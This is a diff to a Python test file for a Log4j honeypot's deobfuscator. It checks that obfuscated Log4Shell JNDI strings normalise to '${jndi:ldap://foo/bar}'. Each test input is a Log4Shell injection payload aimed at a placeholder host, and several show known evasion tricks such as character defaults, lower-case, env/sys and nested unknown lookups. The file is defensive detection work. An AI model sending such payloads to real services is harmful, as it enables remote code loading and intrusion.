@@ -1,10 +1,19 @@
-from sampleloader.lookups import Log4jLookup
+from log4pot.deobfuscator import deobfuscate
 
 def test_simple():
-    assert Log4jLookup("${jndi:ldap://foo/bar}") == "ldap://foo/bar"
+    assert deobfuscate("${jndi:ldap://foo/bar}") == "${jndi:ldap://foo/bar}"
 
 def test_obfusc_colons():
-    assert Log4jLookup("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://foo/bar") == "ldap://foo/bar"
+    assert deobfuscate("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://foo/bar}") == "${jndi:ldap://foo/bar}"
 
 def test_obfusc_lower():
-    assert Log4jLookup("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo/bar}") == "ldap://foo/bar"
+    assert deobfuscate("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo/bar}") == "${jndi:ldap://foo/bar}"
+
+def test_obfusc_env():
+    assert deobfuscate("${jndi:ldap://${env:foo}/${sys:bar}}") == "${jndi:ldap://foo/bar}"
+
+def test_obfusc_unknown():
+    assert deobfuscate("${jndi${nagli:-:}ldap:${::-/}/foo/bar}") == "${jndi:ldap://foo/bar}"
+
+def test_obfusc_nested_unknown():
+    assert deobfuscate("${jnd${123%25ff:-${123%25ff:-i:}}ldap://foo/bar}") == "${jndi:ldap://foo/bar}"
